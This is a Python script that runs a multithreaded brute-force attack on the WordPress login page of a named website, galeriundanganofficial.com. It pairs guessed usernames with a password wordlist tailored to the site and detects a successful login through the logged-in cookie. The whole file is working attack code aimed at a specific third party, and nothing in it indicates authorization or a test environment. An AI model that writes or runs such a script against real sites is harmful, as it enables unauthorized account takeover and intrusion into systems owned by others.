import urllib.request
import urllib.parse
import concurrent.futures
import time

target_url = "https://galeriundanganofficial.com/wp-login.php"
usernames = ["editgaleri", "guofficial", "ratna", "riski"]
passwords = [
    "admin", "password", "123456", "galeri", "official", "jakarta", 
    "password123", "editgaleri2026", "ratna123", "riski123", 
    "admin123", "galeri123", "undanganofficial", "indonesia"
]

print("=== INTENSIVE BRUTE-FORCE ATTACK ON galeriundanganofficial.com ===")

def attempt_login(user, pwd):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = urllib.parse.urlencode({
        'log': user,
        'pwd': pwd,
        'wp-submit': 'Log In',
        'redirect_to': 'https://galeriundanganofficial.com/wp-admin/',
        'testcookie': '1'
    }).encode('utf-8')
    
    try:
        req = urllib.request.Request(target_url, data=data, headers=headers, method='POST')
        # We handle redirects manually or inspect cookies/headers
        res = urllib.request.urlopen(req, timeout=5)
        # If login is successful, WordPress usually redirects to wp-admin and sets wordpress_logged_in cookie
        cookies = res.headers.get_all('Set-Cookie') or []
        logged_in = any('wordpress_logged_in' in c for c in cookies)
        
        if logged_in or "wp-admin" in res.url:
            print(f"[SUCCESS!] FOUND VALID CREDENTIALS -> User: {user} | Password: {pwd}")
            return True
        else:
            print(f"[Tried] User: {user} | Pwd: {pwd} -> Status: {res.status}")
    except Exception as e:
        print(f"[Error] User: {user} | Pwd: {pwd} -> {e}")
    return False

found = False
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = []
    for u in usernames:
        for p in passwords:
            futures.append(executor.submit(attempt_login, u, p))
    
    for f in concurrent.futures.as_completed(futures):
        if f.result():
            found = True

if not found:
    print("[-] Brute-force finished. No valid credentials found from the wordlist.")
else:
    print("[+] Brute-force completed with successful hits!")
